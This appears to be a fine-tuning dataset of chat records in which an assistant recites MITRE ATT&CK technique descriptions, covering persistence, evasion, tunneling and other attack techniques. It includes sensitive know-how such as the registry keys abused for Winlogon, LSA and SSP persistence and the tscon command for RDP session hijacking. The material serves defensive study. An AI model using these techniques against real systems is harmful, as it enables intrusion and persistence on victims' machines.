{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Implant Internal Image' and with the Id: T1525 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Implant Internal Image' and with the Id: T1525 is described as follows: Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019). The systems targeted by this attack pattern are: IaaS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Protocol Tunneling' and with the Id: T1572 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Protocol Tunneling' and with the Id: T1572 is described as follows: Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Control Panel' and with the Id: T1218.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Control Panel' and with the Id: T1218.002 is described as follows: Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Address Translation Traversal' and with the Id: T1599.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Address Translation Traversal' and with the Id: T1599.001 is described as follows: Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities. The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Upload Tool' and with the Id: T1608.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Upload Tool' and with the Id: T1608.002 is described as follows: Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Security Support Provider' and with the Id: T1547.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Security Support Provider' and with the Id: T1547.005 is described as follows: Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Winlogon Helper DLL' and with the Id: T1004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Winlogon Helper DLL' and with the Id: T1004 is described as follows: Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Binary Padding' and with the Id: T1009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Binary Padding' and with the Id: T1009 is described as follows: Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary. This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Use Alternate Authentication Material' and with the Id: T1550 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Use Alternate Authentication Material' and with the Id: T1550 is described as follows: Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.. The systems targeted by this attack pattern are: Windows, Office 365, SaaS, Google Workspace, IaaS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Desktop Protocol' and with the Id: T1076 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Desktop Protocol' and with the Id: T1076 is described as follows: Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Threat Intel Vendors' and with the Id: T1597.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Threat Intel Vendors' and with the Id: T1597.001 is described as follows: Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Other Network Medium' and with the Id: T1011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Other Network Medium' and with the Id: T1011 is described as follows: Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Device Configuration Dump' and with the Id: T1602.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Device Configuration Dump' and with the Id: T1602.002 is described as follows: Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. . The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Gather Victim Identity Information' and with the Id: T1589 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Gather Victim Identity Information' and with the Id: T1589 is described as follows: Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Authentication Package' and with the Id: T1131 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Authentication Package' and with the Id: T1131 is described as follows: Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=<target binary></code>. The binary will then be executed by the system when the authentication packages are loaded.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Extra Window Memory Injection' and with the Id: T1181 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Extra Window Memory Injection' and with the Id: T1181 is described as follows: Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.Execution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable or Modify System Firewall' and with the Id: T1562.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable or Modify System Firewall' and with the Id: T1562.004 is described as follows: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Archive Collected Data' and with the Id: T1560 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Archive Collected Data' and with the Id: T1560 is described as follows: An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launchctl' and with the Id: T1152 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launchctl' and with the Id: T1152 is described as follows: Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\"</code>. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SIP and Trust Provider Hijacking' and with the Id: T1553.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SIP and Trust Provider Hijacking' and with the Id: T1553.003 is described as follows: Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Generation Algorithms' and with the Id: T1483 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Generation Algorithms' and with the Id: T1483 is described as follows: Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)DGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Browser Session Hijacking' and with the Id: T1185 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Browser Session Hijacking' and with the Id: T1185 is described as follows: Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual). The systems targeted by this attack pattern are: Windows ."}]}
